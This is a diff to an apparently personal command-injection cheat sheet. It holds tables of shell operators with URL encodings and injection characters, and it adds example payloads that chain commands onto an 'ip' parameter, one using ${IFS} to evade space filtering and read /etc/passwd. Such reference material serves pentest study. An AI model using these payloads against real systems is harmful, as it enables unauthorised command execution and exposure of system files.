@@ -20,8 +20,8 @@ if (isset($_GET['filename'])) {
 | Pipe               | `\|`                 | `%7c`                 |
 | AND                | `&&`                | `%26%26`              |
 | OR                 | `\|\|`                | `%7c%7c`              |
-| Sub-Shell          | `` `..` ``          | `%60%60`              |
-| Sub-Shell          | `$()`                | `%24%28%29`           |
+| Sub-Shell (lINUX)          | `` `..` ``          | `%60%60`              |
+| Sub-Shell (lINUX)          | `$()`                | `%24%28%29`           |
 # Commond types
 | Injection Type | Operators |
 |---|---|
@@ -36,3 +36,9 @@ if (isset($_GET['filename'])) {
 | XQuery Injection | `' ; -- /* */` |
 | Shellcode Injection | `\x \u %u %n` |
 | Header Injection | `\n \r \n \r \t %0d %0a %09` |
+# Examples
+```bash
+# ${IFS}
+?ip=127.0.0.1;cat${IFS}/etc/passwd
+?ip=127.0.0.1;{ls,-la}
+```
